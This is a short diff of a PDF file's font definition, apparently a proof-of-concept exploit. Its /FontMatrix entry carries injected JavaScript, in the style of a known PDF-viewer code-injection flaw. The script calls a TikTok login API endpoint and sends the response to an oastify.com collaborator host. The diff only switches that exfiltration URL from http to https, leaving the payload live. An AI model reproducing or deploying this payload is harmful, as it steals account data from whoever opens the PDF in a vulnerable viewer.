@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-fetch\('https://academy-outbound-ads.tiktok.com/chxt_api/api/login/main',{'method':'post'}\).then\(\(r\)=>r.text\(\)\).then\(\(t\)=>fetch\('http://rb6w3162o0q8ilgr8bq3eeyygpmga8yx.oastify.com/?c=${encodeURIComponent\(t\)}'\)\)
+fetch\('https://academy-outbound-ads.tiktok.com/chxt_api/api/login/main',{'method':'post'}\).then\(\(r\)=>r.text\(\)\).then\(\(t\)=>fetch\('https://rb6w3162o0q8ilgr8bq3eeyygpmga8yx.oastify.com/?c=${encodeURIComponent\(t\)}'\)\)
 //)]
 /Subtype/Type1
 /FirstChar 65
